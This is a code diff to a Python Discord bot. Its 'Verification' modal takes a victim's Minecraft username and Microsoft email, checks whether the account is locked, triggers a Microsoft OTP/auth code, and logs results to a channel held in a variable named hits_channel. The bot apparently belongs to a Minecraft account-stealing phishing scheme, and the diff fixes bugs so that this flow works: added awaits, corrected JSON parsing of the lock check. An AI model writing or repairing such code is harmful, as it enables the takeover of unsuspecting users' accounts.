@@ -34,28 +34,28 @@ class MyModalOne(ui.Modal, title="Verification"):
         logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
-        await interaction.response.defer()
-
         # Checks if the account is locked
         # Special thanks to Revive (kpriest95523) for this request
         lockedInfo = checkLocked(self.email.value)
 
-        if "Value" not in lockedInfo or lockedInfo["Value"]["isAccountSuspended"]:
-            interaction.response.send_message(
+        if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
+            await interaction.response.send_message(
                 "❌ This microsoft account is locked, as so we cannot verify it. Try again with another account.",
                 ephemeral = True
             )
 
-            logs_channel.send(
+            await logs_channel.send(
                 embed = Embed (
                     title = f"{interaction.user.name} | {interaction.user.id}",
-                    description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Locked Microsoft Account```",
+                    description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Failed to verify (Locked Microsoft Account)```",
                     timestamp = datetime.datetime.now(),
                     colour = 0xFF5C5C,                         
                     ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}")
             )
             
             return
+
+        await interaction.response.defer()
 
         # Sends OTP/Auth code
         emailInfo = sendAuth(self.email.value)
